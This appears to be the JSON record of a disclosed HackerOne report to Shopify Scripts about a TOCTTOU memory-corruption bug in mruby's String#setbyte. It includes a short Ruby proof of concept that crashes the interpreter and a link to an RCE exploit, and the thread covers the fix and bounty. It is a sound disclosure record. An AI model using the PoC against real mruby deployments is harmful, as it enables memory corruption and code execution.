{"id":181893,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4OTM=","url":"https://hackerone.com/reports/181893","title":"TOCTTOU bug in mrb_str_setbyte leading the memory corruption","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2016-11-13T09:43:49.735Z","submitted_at":"2016-11-13T09:43:49.735Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"raydot","url":"/raydot","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-16T21:35:57.209Z","bug_reporter_agreed_on_going_public_at":"2016-12-16T21:35:57.180Z","team_member_agreed_on_going_public_at":"2016-12-16T19:52:36.239Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.\n\nFollowing is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.\n\n```\n$s = \"9\" + (\"\\n\" * (1024*1024-1))\n$k = []\n\nclass Tmp\n    def to_i\n        $k.push(\"a\"*1024)\n        $s.chomp! ''\n        $s.succ!\n        95\n    end\nend\ntmp = Tmp.new\n$s.setbyte(128, tmp)\nputs $k[0]\n```\n\nAttached is a patch to mruby to resolve this issue.","vulnerability_information_html":"\u003cp\u003eThe String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.\u003c/p\u003e\n\n\u003cp\u003eFollowing is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$s = \u0026quot;9\u0026quot; + (\u0026quot;\\n\u0026quot; * (1024*1024-1))\n$k = []\n\nclass Tmp\n    def to_i\n        $k.push(\u0026quot;a\u0026quot;*1024)\n        $s.chomp! \u0026#39;\u0026#39;\n        $s.succ!\n        95\n    end\nend\ntmp = Tmp.new\n$s.setbyte(128, tmp)\nputs $k[0]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAttached is a patch to mruby to resolve this issue.\u003c/p\u003e\n","bounty_amount":"20000.0","formatted_bounty":"$20,000","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":134443,"file_name":"patch2.diff","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/134/443/1233a0c902fddfd27e2ca6f3de463366105f1a31/patch2.diff?response-content-disposition=attachment%3B%20filename%3D%22patch2.diff%22%3B%20filename%2A%3DUTF-8%27%27patch2.diff\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044549Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=dff37b9c4d4c0d514777a80a0f49bc7ec8eab745bfa954aa1aa20d15c4374fdc","file_size":564,"type":"text/x-diff"}],"allow_singular_disclosure_at":"2017-01-15T19:52:36.266Z","allow_singular_disclosure_after":-124707193.52436863,"singular_disclosure_allowed":true,"vote_count":23,"voters":["beched","dkasak","mpz","eveeez","r3y","ak1t4","zerotoone","paulos_","japz","secbughunter","and 13 more..."],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1297393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a fully generic RCE exploit for this vulnerability targeting Mac OS X. It should work on any build of mruby-engine and any version of Mac OS X. It currently executes system(\"ls\"), but it can be modified to call arbitrary commands.\n\nhttps://gist.github.com/anonymous/ff62ba5f8b0f90c5330b00944390f1a7","markdown_message":"\u003cp\u003eHere is a fully generic RCE exploit for this vulnerability targeting Mac OS X. It should work on any build of mruby-engine and any version of Mac OS X. It currently executes system(\u0026quot;ls\u0026quot;), but it can be modified to call arbitrary commands.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://gist.github.com/anonymous/ff62ba5f8b0f90c5330b00944390f1a7\" href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fanonymous%2Fff62ba5f8b0f90c5330b00944390f1a7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://gist.github.com/anonymous/ff62ba5f8b0f90c5330b00944390f1a7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-14T02:02:18.511Z","updated_at":"2016-11-14T02:02:18.511Z","actor":{"username":"raydot","cleared":false,"url":"/raydot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1299562,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report! We've reproduced the issue, and our engineering team is investigating.","markdown_message":"\u003cp\u003eThank you for your report! We\u0026#39;ve reproduced the issue, and our engineering team is investigating.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-14T23:59:02.731Z","updated_at":"2016-11-14T23:59:02.731Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1299563,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-14T23:59:08.719Z","updated_at":"2016-11-14T23:59:08.719Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":7580},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1303160,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @raydot, thanks for the great report, the patch and the RCE proof of concept! We've deployed a fix for this in our production environment as of earlier today.\n\nI'm marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact \u0026 determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/raydot\"\u003e@raydot\u003c/a\u003e, thanks for the great report, the patch and the RCE proof of concept! We\u0026#39;ve deployed a fix for this in our production environment as of earlier today.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m marking this issue as resolved now but we still need to fix this bug upstream before we can assess the impact \u0026amp; determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-16T21:14:16.746Z","updated_at":"2016-11-16T21:14:16.746Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"raydot","url":"/raydot"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1319231,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The fix for this issue has been merged upstream: https://github.com/mruby/mruby/commit/83005d83d8ba95524436409d5d73fd82b63bc115","markdown_message":"\u003cp\u003eThe fix for this issue has been merged upstream: \u003ca title=\"https://github.com/mruby/mruby/commit/83005d83d8ba95524436409d5d73fd82b63bc115\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F83005d83d8ba95524436409d5d73fd82b63bc115\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/83005d83d8ba95524436409d5d73fd82b63bc115\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-11-25T15:47:40.601Z","updated_at":"2016-11-25T15:47:40.601Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370039,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify Scripts and the mruby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-16T19:52:29.669Z","updated_at":"2016-12-16T19:52:29.669Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"20000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"raydot","url":"/raydot"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370040,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T19:52:36.252Z","updated_at":"2016-12-16T19:52:36.252Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T21:35:57.193Z","updated_at":"2016-12-16T21:35:57.193Z","actor":{"username":"raydot","cleared":false,"url":"/raydot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370358,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-16T21:35:57.222Z","updated_at":"2016-12-16T21:35:57.222Z","actor":{"username":"raydot","cleared":false,"url":"/raydot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}